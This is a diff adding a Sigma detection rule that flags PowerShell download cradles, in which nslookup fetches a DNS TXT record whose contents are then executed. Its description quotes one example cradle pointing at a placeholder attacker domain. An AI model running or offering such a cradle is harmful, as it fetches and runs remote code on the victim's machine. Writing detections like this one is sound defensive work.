@@ -1,0 +1,22 @@
+title: Nslookup PwSh Download Cradle
+id: 72671447-4352-4413-bb91-b85569687135
+status: experimental
+description: This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
+author: Zach Mathis (@yamatosecurity)
+date: 2022/09/06
+tags:
+    - attack.command_and_control
+    - attack.t1105
+    - attack.t1071.004
+references:
+    - https://twitter.com/alh4zr3d/status/1566489367232651264
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        ParentImage|endswith: '\powershell.exe'
+        Image|contains: nslookup
+        CommandLine|contains: '=txt '
+    condition: selection
+level: medium
